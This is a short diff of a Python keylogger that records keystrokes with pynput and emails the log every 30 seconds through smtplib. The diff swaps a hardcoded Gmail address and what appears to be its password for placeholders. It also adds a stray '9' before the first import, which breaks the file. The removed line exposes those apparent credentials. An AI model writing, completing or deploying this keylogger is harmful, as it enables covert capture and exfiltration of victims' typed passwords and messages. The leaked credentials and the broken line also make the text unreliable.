@@ -1,4 +1,4 @@
-import pynput.keyboard
+9import pynput.keyboard
 import smtplib
 import threading
 
@@ -30,7 +30,7 @@ def send_email(email,password,message):
 
 def thread_function():
     global log
-    send_email("pirateluffy1907@gmail.com", "Kingofthepirates", log.encode('utf-8'))
+    send_email("your email", "your password", log.encode('utf-8'))
     log = ""
     timer_object = threading.Timer(30,thread_function)
     timer_object.start()
